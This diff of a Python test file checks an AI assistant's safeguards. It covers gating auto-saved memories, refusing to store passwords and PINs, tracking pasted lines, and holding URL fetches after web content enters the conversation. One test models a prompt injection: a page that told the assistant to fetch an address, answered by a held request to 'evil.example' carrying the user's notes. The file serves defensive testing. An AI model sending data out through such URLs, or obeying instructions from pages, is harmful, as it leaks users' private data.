@@ -1132,4 +1132,502 @@ def test_a_restored_conversation_starts_with_the_outside_record_set():
 
     ctx = CommandContext(state=_initial_state(), make_initial_state=_initial_state, db_path="")
     _swap_to_messages(ctx, [HumanMessage(content="I'm vegetarian")])
-    assert provenance.of(ctx.state).untrusted is True
+    p = provenance.of(ctx.state)
+    assert p.untrusted is True and p.entered is False    # unknown, not seen: no URL hold
+
+
+# ══ the code review of 2026-10-04 (second) — one test per finding ══════════════════════════
+# ── R1: a "no" at the gate holds for the rest of the turn, reworded or not ─────────────────
+
+
+def _declined(cid="m1"):
+    return ToolMessage(content="The user declined this.", tool_call_id=cid, name="remember",
+                       additional_kwargs={"saturn_status": "skipped"})
+
+
+def test_after_a_declined_remember_the_next_one_this_turn_asks_too(isolated_paths):
+    from core import auto_memory
+
+    state = _state(HumanMessage(content="I'm vegetarian on weekdays"),
+                   _remember("User is vegetarian on weekdays, strictly"), _declined())
+    why = auto_memory.why_not(
+        _remember("User is vegetarian on weekdays", cid="m2").tool_calls[0], state)
+    assert why is not None and "declined" in why
+
+
+def test_a_decline_does_not_outlive_its_turn(isolated_paths):
+    from core import auto_memory
+
+    state = _state(HumanMessage(content="I'm vegetarian on weekdays"),
+                   _remember("User is vegetarian on weekdays, strictly"), _declined(),
+                   AIMessage(content="Okay, not saved."),
+                   HumanMessage(content="I live in Berlin"))
+    assert auto_memory.why_not(
+        _remember("User lives in Berlin", cid="m2").tool_calls[0], state) is None
+
+
+# ── R2: a fact written before the turn failed is still announced ───────────────────────────
+
+
+def test_the_repl_keeps_the_auto_learned_events_of_a_turn_that_later_fails():
+    from app.repl import _auto_memory_notes, _keeping_auto_memory
+
+    seen, learned = [], []
+    on_update = _keeping_auto_memory(lambda node, delta: seen.append(node), learned)
+    on_update("agent", {"messages": []})
+    on_update("tools", {"tool_events": [
+        {"name": "read_file", "args": {}, "ok": True},
+        {"name": "remember", "args": {"fact": "User is vegetarian"}, "auto_memory": 7},
+        {"name": "remember", "args": {"fact": "User likes tea"}, "auto_memory_known": 3}]})
+    assert seen == ["agent", "tools"]            # the wrapped subscriber still runs
+    assert _auto_memory_notes({"tool_events": learned}) == [
+        "remembered #7: User is vegetarian — you said it · /memory forget 7 undoes it",
+        "already remembered as #3: User likes tea"]
+
+
+# ── R3: asked is not stated — with or without the "?", behind a filler word, or embedded ───
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("is Petra my manager", "Petra is the user's manager"),
+    ("Hey is Petra my manager, or is it Sam?", "Petra is the user's manager"),
+    ("tell me if Petra is my manager", "Petra is the user's manager"),
+    ("I wonder whether Petra is my manager", "Petra is the user's manager"),
+    ("So am I vegetarian, or what?", "User is vegetarian"),
+    ("don't I live in Berlin", "User does not live in Berlin"),
+    ("When I travel, I'm vegetarian", "User is vegetarian"),          # a condition, dropped
+    ("I'm vegetarian, unless there is bacon", "User is vegetarian"),
+])
+def test_a_question_or_a_condition_is_not_a_statement(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    why = auto_memory.why_not(_remember(fact).tool_calls[0], _state(HumanMessage(content=typed)))
+    assert why is not None
+
+
+# ── R4: a fact may not leave out part of the clause it comes from ──────────────────────────
+
+
+@pytest.mark.parametrize("typed, fact, left_out", [
+    ("My brother is vegetarian", "User is vegetarian", "'brother'"),
+    ("I used to be vegetarian", "User is vegetarian", "'used'"),
+    ("I'm vegetarian on weekdays", "User is vegetarian", "'weekdays'"),
+    ("I hate cilantro but my sister loves sushi", "User loves cilantro", ""),
+    ("I don't like sushi, I love ramen", "User does not like ramen", ""),
+    ("I don't have a car, a dog, or a cat", "User has a dog", "not"),
+    ("I never eat pork, beef, or shellfish", "User eats beef", ""),
+])
+def test_a_fact_that_drops_part_of_what_was_said_faces_the_gate(
+        isolated_paths, typed, fact, left_out):
+    from core import auto_memory
+
+    why = auto_memory.why_not(_remember(fact).tool_calls[0], _state(HumanMessage(content=typed)))
+    assert why is not None and left_out in why
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("Remember that I work at Acme", "User works at Acme"),
+    ("Please remember I'm vegetarian", "User is vegetarian"),
+    ("I'm vegetarian and I need a recipe for tonight", "User is vegetarian"),
+    ("I hate cilantro but my sister loves sushi", "User hates cilantro"),
+    ("I hate cilantro but my sister loves sushi", "User's sister loves sushi"),
+    ("No, I live in Berlin", "User lives in Berlin"),
+    ("I'm vegetarian, not vegan", "User is not vegan"),
+    ("I like tea, coffee, and mate", "User likes tea, coffee and mate"),
+    ("I don't have a car, a dog, or a cat", "User does not have a car, a dog or a cat"),
+])
+def test_a_whole_clause_restated_still_lands_without_the_gate(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    assert auto_memory.why_not(_remember(fact).tool_calls[0],
+                               _state(HumanMessage(content=typed))) is None
+
+
+# ── R5: a fact retired on the way to "already remembered" is still named ───────────────────
+
+
+def test_the_note_names_a_fact_retired_by_a_replacement_that_was_already_stored(isolated_paths):
+    import nodes.tools as tn
+    from app.repl import _auto_memory_notes
+    from stores import memory_registry as mr
+
+    mr.add_memory("I live in Paris")
+    mr.add_memory("I live in Berlin")
+    delta = tn.tool_node({"messages": [HumanMessage(content="I live in Berlin, not Paris"),
+                                       _remember("I live in Berlin", replaces=1)],
+                          "user_stated": ["m1"]})
+    ev = delta["tool_events"][0]
+    assert mr.entry(1) is None
+    assert ev["auto_memory_known"] == 2
+    assert ev["auto_memory_replaced"] == {"id": 1, "text": "I live in Paris"}
+    assert _auto_memory_notes({"tool_events": [ev]}) == [
+        'already remembered as #2: I live in Berlin (removed #1 "I live in Paris")']
+
+
+# ── R6: the conversation's record is auto-learn's; the URL hold reads what is in front of it ─
+
+
+_DOCS = "https://docs.python.org/3/library/asyncio.html"
+
+
+def _fetch(url=_DOCS):
+    return [{"name": "web_extract", "args": {"url": url}, "id": "w1"}]
+
+
+def test_the_url_hold_is_not_armed_by_a_restored_sessions_blank_record(isolated_paths):
+    import nodes.approval as ap
+    from core import auto_memory, provenance
+    from core.state import OUTSIDE_UNKNOWN
+
+    state = {"messages": [HumanMessage(content="I'm vegetarian. fetch the asyncio docs page")],
+             "outside_seen": OUTSIDE_UNKNOWN}           # /resume: nobody saw what entered it
+    p = provenance.of(state)
+    assert p.untrusted is True and p.entered is False
+    assert ap.provenance(state)[2] is False
+    assert ap._url_holds(_fetch(), state) == {}
+    # auto-learn still asks: for it, not knowing is reason enough
+    assert "outside" in auto_memory.why_not(_remember("User is vegetarian").tool_calls[0], state)
+
+
+def test_the_url_hold_still_holds_a_composed_url_after_a_page_in_the_conversation(isolated_paths):
+    import nodes.approval as ap
+
+    state = {"messages": [HumanMessage(content="summarize example.com"),
+                          *_fetched("About us.", cid="w0")]}
+    assert ap.provenance(state)[2] is True
+    assert ap._url_holds(_fetch(), state) == {"w1": quarantine.COMPOSED_URL_NOTE}
+
+
+# ── R7: "can't" and "cannot" are one word ──────────────────────────────────────────────────
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("I can't eat gluten", "User cannot eat gluten"),
+    ("I cannot eat gluten", "User can't eat gluten"),
+    ("I can not eat gluten", "User cannot eat gluten"),
+])
+def test_cant_and_cannot_are_the_same_statement(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    assert auto_memory.why_not(_remember(fact).tool_calls[0],
+                               _state(HumanMessage(content=typed))) is None
+
+
+# ── R8: talk about passwords is not a password; a passphrase is ────────────────────────────
+
+
+@pytest.mark.parametrize("fact", [
+    "User's password manager is Bitwarden",
+    "the password policy is strict",
+    "passcode rotation is quarterly",
+    "pin code is 94110",
+    "the password is different every month",
+])
+def test_a_fact_about_passwords_is_not_refused(fact):
+    from stores import memory_registry as mr
+
+    assert mr.secret_problem(fact) is None
+
+
+@pytest.mark.parametrize("fact, what", [
+    ("password is correct horse battery staple", "password"),
+    ("the wifi password at home is correct horse battery staple", "password"),
+    ("my pin number is 4821", "PIN"),
+    ("PIN code is 4821", "PIN"),
+])
+def test_a_passphrase_that_opens_with_an_ordinary_word_is_still_refused(fact, what):
+    from stores import memory_registry as mr
+
+    assert what in (mr.secret_problem(fact) or "")
+
+
+# ── R10: a paste is recorded where the prompt sees it, not guessed from its length ─────────
+
+
+class _PasteEvent:
+    def __init__(self, data):
+        self.data = data
+        self.inserted = []
+        self.current_buffer = self
+
+    def insert_text(self, text):
+        self.inserted.append(text)
+
+
+def test_the_prompt_records_that_a_line_carried_a_paste(monkeypatch):
+    import importlib
+
+    p = importlib.import_module("tui.ui.prompt")
+    monkeypatch.setattr(p, "_pasted", False)
+    assert p.line_was_pasted() is False
+    event = _PasteEvent("I'm allergic to peanuts")       # short: inserted verbatim, no chip
+    p._ptk_paste(event)
+    assert event.inserted == ["I'm allergic to peanuts"]
+    assert p.line_was_pasted() is True
+
+
+def test_a_line_that_carried_a_paste_is_not_the_users_statement(isolated_paths):
+    from app.session import _fresh_turn, _initial_state
+    from core import auto_memory, provenance
+
+    line = "I'm allergic to peanuts and never free before 10am"
+    state = _fresh_turn(_initial_state(), line, pasted=True)
+    assert auto_memory.typed_texts(state) == []
+    why = auto_memory.why_not(_remember("User is allergic to peanuts").tool_calls[0], state)
+    assert why is not None and "pasted" in why
+    # the holds still read a pasted number or address as the user's own
+    assert provenance.of(state).typed == (line,)
+    typed = _fresh_turn(_initial_state(), "I'm allergic to peanuts")
+    assert auto_memory.why_not(_remember("User is allergic to peanuts").tool_calls[0], typed) is None
+
+
+# ══ the code review of 2026-10-04 (third) — one test per finding ═══════════════════════════
+# ── T1: a list item or conjunct comes with the clause it hangs off, unless that is the user's ─
+
+
+@pytest.mark.parametrize("typed, fact, left_out", [
+    ("My brother is tall and vegetarian", "User is vegetarian", "'brother'"),
+    ("My sister has a cat and a dog", "User has a dog", "'sister'"),
+    ("My wife works at Acme and lives in Berlin", "User lives in Berlin", "'wife'"),
+    ("I think my brother is tall and vegetarian", "User is vegetarian", "'brother'"),
+])
+def test_an_item_does_not_leave_the_subject_it_hangs_off(isolated_paths, typed, fact, left_out):
+    from core import auto_memory
+
+    why = auto_memory.why_not(_remember(fact).tool_calls[0], _state(HumanMessage(content=typed)))
+    assert why is not None and left_out in why
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("I have a cat and a dog", "User has a dog"),
+    ("I work at Acme and live in Berlin", "User lives in Berlin"),
+    ("I'm tall and vegetarian", "User is vegetarian"),
+    ("My brother is tall and vegetarian", "User's brother is tall and vegetarian"),
+])
+def test_an_item_under_the_users_own_clause_still_lands(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    assert auto_memory.why_not(_remember(fact).tool_calls[0],
+                               _state(HumanMessage(content=typed))) is None
+
+
+# ── T2: a clause that qualifies, retracts or reports what the fact says cannot be dropped ──
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("I'm vegetarian, not really", "User is vegetarian"),
+    ("I'm vegetarian, mostly", "User is vegetarian"),
+    ("I'm vegetarian, on weekdays", "User is vegetarian"),
+    ("I work at Acme, not anymore", "User works at Acme"),
+    ("On weekdays, I'm vegetarian", "User is vegetarian"),
+    ("Until last year, I worked at Acme", "User worked at Acme"),
+    ("Hypothetically, I'm vegetarian", "User is vegetarian"),
+    ("My sister said, I'm vegetarian", "User is vegetarian"),
+    ("I'm vegetarian, I think", "User is vegetarian"),
+])
+def test_a_qualifier_a_retraction_or_a_report_cannot_be_dropped(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    why = auto_memory.why_not(_remember(fact).tool_calls[0], _state(HumanMessage(content=typed)))
+    assert why is not None
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("For the record, I'm vegetarian", "User is vegetarian"),
+    ("Like I said, I'm vegetarian", "User is vegetarian"),
+    ("I'm vegetarian, thanks", "User is vegetarian"),
+    ("I like tea, not coffee", "User likes tea"),
+    ("On weekdays, I'm vegetarian", "User is vegetarian on weekdays"),
+    ("I'm vegetarian, not really", "User is not really vegetarian"),
+    ("My sister said, I'm vegetarian", "User's sister said user is vegetarian"),
+])
+def test_an_aside_or_a_kept_qualifier_still_lands(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    assert auto_memory.why_not(_remember(fact).tool_calls[0],
+                               _state(HumanMessage(content=typed))) is None
+
+
+# ── T3: the tense is part of what was said ─────────────────────────────────────────────────
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("I was vegetarian", "User is vegetarian"),
+    ("I had a dog", "User has a dog"),
+    ("I'm vegetarian", "User was vegetarian"),
+    ("I worked at Acme", "User works at Acme"),
+    ("I work at Acme", "User worked at Acme"),
+    ("I'm moving to Berlin", "User moved to Berlin"),
+])
+def test_a_fact_in_another_tense_faces_the_gate(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    why = auto_memory.why_not(_remember(fact).tool_calls[0], _state(HumanMessage(content=typed)))
+    assert why is not None
+
+
+@pytest.mark.parametrize("typed, fact", [
+    ("I was vegetarian for ten years", "User was vegetarian for ten years"),
+    ("I worked at Acme", "User worked at Acme"),
+    ("I'm married", "User is married"),
+    ("I've been vegetarian since 2020", "User has been vegetarian since 2020"),
+    ("I'm living in Berlin", "User lives in Berlin"),
+])
+def test_a_fact_in_the_tense_it_was_said_in_still_lands(isolated_paths, typed, fact):
+    from core import auto_memory
+
+    assert auto_memory.why_not(_remember(fact).tool_calls[0],
+                               _state(HumanMessage(content=typed))) is None
+
+
+def test_cannot_is_not_listed_as_a_negation_it_never_reaches(isolated_paths):
+    from core import auto_memory
+
+    assert "cannot" not in auto_memory.NEGATIONS
+    assert auto_memory.content_words("I cannot eat gluten") == ["can", "not", "eat", "gluten"]
+
+
+# ── T4: a line is typed by hand only when the prompt saw it typed ──────────────────────────
+
+
+class _EnterEvent:
+    def __init__(self, buffer):
+        self.current_buffer = buffer
+
+
+def _buffer_with_history(*lines):
+    from prompt_toolkit.buffer import Buffer
+
+    buf = Buffer(multiline=True)
+    for line in lines:                      # what prompt_toolkit's history loader does
+        buf._working_lines.appendleft(line)
+        buf.working_index += 1
+    return buf
+
+
+def test_a_line_recalled_from_history_is_not_typed_by_hand(monkeypatch):
+    import importlib
+
+    p = importlib.import_module("tui.ui.prompt")
+    monkeypatch.setattr(p, "_pasted", False)
+    buf = _buffer_with_history("I'm allergic to penicillin")
+    buf.insert_text("I'm vegetarian")
+    p._ptk_enter(_EnterEvent(buf))
+    assert p.line_was_pasted() is False                 # typed on the new line
+    buf = _buffer_with_history("I'm allergic to penicillin")
+    buf.history_backward()                              # Up
+    assert buf.text == "I'm allergic to penicillin"
+    buf.insert_text(" and latex")                       # edited or not: its origin is unknown
+    p._ptk_enter(_EnterEvent(buf))
+    assert p.line_was_pasted() is True
+
+
+def test_a_line_typed_ahead_is_not_typed_by_hand(monkeypatch):
+    import app.repl as repl
+
+    class Queue:
+        def __init__(self, *lines):
+            self.lines = list(lines)
+
+        def pop(self):
+            return self.lines.pop(0) if self.lines else None
+
+    monkeypatch.setattr(repl.ui, "echo_queued", lambda line: None)
+    monkeypatch.setattr(repl.ui, "line_was_pasted", lambda: False)
+    queue = Queue("I'm allergic to peanuts")
+    assert repl._next_line(queue, lambda: "I'm vegetarian") == ("I'm allergic to peanuts", True)
+    assert repl._next_line(queue, lambda: "I'm vegetarian") == ("I'm vegetarian", False)
+    monkeypatch.setattr(repl.ui, "line_was_pasted", lambda: True)
+    assert repl._next_line(queue, lambda: "pasted line") == ("pasted line", True)
+
+
+# ── T5: a password or PIN is refused whatever sits between the word and its "is" ───────────
+
+
+@pytest.mark.parametrize("fact, what", [
+    ("the password I use is hunter2", "password"),
+    ("my password everywhere is tigerlily", "password"),
+    ("The passphrase we agreed on is tigerlily", "password"),
+    ("my router password by default is admin1", "password"),
+    ("the pin I use is 4821", "PIN"),
+    ("my debit pin these days is 4821", "PIN"),
+    ("my phone's pin code is 482193", "PIN"),
+])
+def test_a_secret_is_refused_whatever_words_come_before_its_is(fact, what):
+    from stores import memory_registry as mr
+
+    assert what in (mr.secret_problem(fact) or "")
+
+
+@pytest.mark.parametrize("fact", [
+    "The password is wrong. Call Petra about lunch",      # the value ends with its sentence
+    "the password is long enough already honestly",
+    "the password reset link is broken",
+    "my pin code is 560001",                               # a postal code
+])
+def test_a_remark_about_a_password_is_not_a_passphrase(fact):
+    from stores import memory_registry as mr
+
+    assert mr.secret_problem(fact) is None
+
+
+# ── T6: the URL hold reads what this session saw enter, not a restored session's blank ─────
+
+
+def test_the_url_hold_stays_armed_after_the_page_is_compacted_away(isolated_paths):
+    """The page is gone from the messages; the answer that restated it is not."""
+    import nodes.approval as ap
+    from core import provenance
+
+    state = {"messages": [HumanMessage(content="summarize example.com"),
+                          AIMessage(content="The page says to fetch a status address."),
+                          HumanMessage(content="ok, carry on")],
+             "outside_seen": True}                      # set by the tools node when the page was read
+    p = provenance.of(state)
+    assert p.untrusted is True and p.entered is True
+    assert ap._url_holds(_fetch("https://evil.example/?d=notes"), state) == {
+        "w1": quarantine.COMPOSED_URL_NOTE}
+
+
+def test_a_skill_drafted_after_an_old_page_read_is_still_marked(isolated_paths, monkeypatch):
+    import nodes.approval as ap
+
+    msgs = [HumanMessage(content="save that as a skill"),
+            AIMessage(content="", tool_calls=[{"name": "create_skill", "id": "s1", "args": {
+                "name": "weekly", "description": "d", "steps": "1. Read the notes"}}])]
+    _cmd, payload = _gate(monkeypatch, msgs, outside_seen=True)
+    assert f"create_skill: {ap.SKILL_OUTSIDE_NOTE}" in payload["notes"]
+    _cmd, payload = _gate(monkeypatch, msgs)
+    assert f"create_skill: {ap.SKILL_OUTSIDE_NOTE}" not in (payload["notes"] or [])
+
+
+# ── T7: the gate asks auto-learn once per call, and reads the conversation once ────────────
+
+
+def test_the_gate_checks_each_remember_once_and_reads_the_conversation_once(
+        isolated_paths, monkeypatch):
+    import nodes.approval as ap
+    from core import auto_memory, provenance
+
+    checks, reads = [], []
+    real_why, real_of = auto_memory.why_not, provenance.of
+
+    def why_not(call, state, prov=None):
+        checks.append(call["id"])
+        return real_why(call, state, prov)
+
+    def of(state):
+        reads.append(1)
+        return real_of(state)
+
+    monkeypatch.setattr(auto_memory, "why_not", why_not)
+    monkeypatch.setattr(provenance, "of", of)
+    msgs = [HumanMessage(content="I'm vegetarian and my manager is Petra"),
+            AIMessage(content="", tool_calls=[
+                {"name": "remember", "args": {"fact": "User is vegetarian"}, "id": "m1"},
+                {"name": "remember", "args": {"fact": "User's manager is Sam"}, "id": "m2"}])]
+    cmd, payload = _gate(monkeypatch, msgs)
+    assert sorted(checks) == ["m1", "m2"] and len(reads) == 1
+    assert cmd.update["user_stated"] == ["m1"]
+    assert [c["id"] for c in payload["tool_calls"]] == ["m2"]
+    assert any(n.startswith("remember: not saved automatically") for n in payload["notes"])
